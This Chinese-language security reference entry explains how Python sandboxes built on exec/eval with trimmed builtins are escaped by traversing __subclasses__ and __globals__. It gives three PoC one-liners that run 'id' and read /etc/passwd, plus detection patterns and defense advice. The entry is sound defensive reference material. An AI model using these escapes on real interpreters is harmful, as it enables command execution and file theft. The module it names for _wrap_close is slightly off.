---
id: binary-pwn-sandbox-escape-python-jail-subclass-traversal
title: Python 受限执行环境通过子类遍历逃逸到 os/subprocess
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-jail-subclass-traversal
tags:
- python
- pyjail
- sandbox-escape
- cpython
- object-model
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-H
  verified_at: '2026-11-04T19:39:32+08:00'
  notes: 来源 93062；已对照原文核对；子类遍历与三段 PoC 一致，仅将“_wrap_close 的替代类”更正为“catch_warnings 的替代类”；未在真实目标环境复测。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-jail-subclass-traversal/
draft: false
kb_aliases:
- pyjail
- Python 沙箱逃逸
- 子类遍历
- __subclasses__ 逃逸
- Python jail escape
---

## 一句话结论

当 Python“沙箱”只是用 `exec`/`eval` 配一个删减过的 `__builtins__` 时，攻击者可以从任意内置对象沿 `__class__`、`__bases__`、`__subclasses__()`、`__init__.__globals__` 爬到已加载模块的全局命名空间，拿到 `os.system`、`subprocess`、`open` 甚至完整 `__builtins__`。

## 原理

CPython 的对象模型是全局可达的：任何对象都有 `__class__`，类有 `__mro__`/`__bases__`，`object.__subclasses__()` 会枚举解释器中已经加载的全部子类。很多类的 `__init__` 是一个 Python 函数，其 `__globals__` 指向定义该类的模块字典：

- `subprocess._wrap_close.__init__.__globals__` 里有 `system`、`Popen` 等；
- `warnings.catch_warnings.__init__.__globals__` 里有完整 `__builtins__`；
- `importlib` 引导类的 `__init__.__globals__` 里通常有 `_io`/`_os`，可直接 `open` 或读文件；
- `SourceFileLoader.get_data` 可用来读任意文件。

限制 `__builtins__` 只是移除了当前执行帧的“入口”，并没有切断对象图；只要还能创建任意对象（`()`、`[]`、`str` 等）并访问属性，就能重新找到危险函数。

## 触发条件

- 目标用 `exec(code, globals)` / `eval(code, globals)` 执行用户输入；
- 仅通过删减 `__builtins__`、过滤少数字符串来做隔离；
- 解释器进程内已经加载 `subprocess`、`warnings`、`importlib` 等模块（常见）；
- 执行环境没有额外的系统级隔离（seccomp、容器、独立低权限用户）。

## 利用步骤

1. 用 `().__class__.__bases__[0]` 取到 `object`；
2. 调 `__subclasses__()` 列出已加载子类；
3. 按 `__name__` 过滤出 `_wrap_close`、`catch_warnings`、`BuiltinImporter`、`SourceFileLoader` 等；
4. 从 `cls.__init__.__globals__` 取 `system`、`__builtins__["__import__"]`、`_io.open` 等；
5. 执行命令或读文件。

## PoC

```python
# 直接拿 os.system（依赖 subprocess 已加载）
[x for x in ().__class__.__bases__[0].__subclasses__()
 if x.__name__ == "_wrap_close"][0].__init__.__globals__["system"]("id")

# 恢复完整 builtins，再 import os
[x for x in ().__class__.__bases__[0].__subclasses__()
 if x.__name__ == "catch_warnings"][0].__init__.__globals__["__builtins__"]["__import__"]("os").system("id")

# 通过 importlib 引导类 globals 里的 _io 读文件
[c.__init__.__globals__["_io"].open("/etc/passwd").read()
 for c in ().__class__.__bases__[0].__subclasses__()
 if c.__name__ == "BuiltinImporter"]
```

`catch_warnings` 也可用 `codecs.IncrementalDecoder`、`importlib._bootstrap._ModuleLock` 等替代；子类下标随运行时变化，按名字过滤比硬编码下标稳。

## 变体与关联

- 变体：从 `catch_warnings` 恢复 `__builtins__`；用 `SourceFileLoader.get_data` 直接读文件；通过 `__globals__` 找 `sys.modules` 再取任意已加载模块。
- 关联：审计钩子沙箱的绕过（钩子函数同样在模块全局中解析名字）；`eval` 关键字过滤的绕过。

## 检测与防御

- 检测：输入中出现 `__class__`、`__bases__`、`__subclasses__`、`__globals__`、`__builtins__`、`__mro__` 等属性访问链，尤其是动态拼接/chr 编码后的版本。
- 防御：不要把 `exec`/`eval` 当沙箱；需要执行不可信代码时用独立进程 + 低权限用户 + seccomp/容器/WASM 等系统级隔离；或使用真正的对象能力受限运行时。
- `__builtins__` 白名单只能提高门槛，无法阻断对象图遍历，不能作为唯一防线。
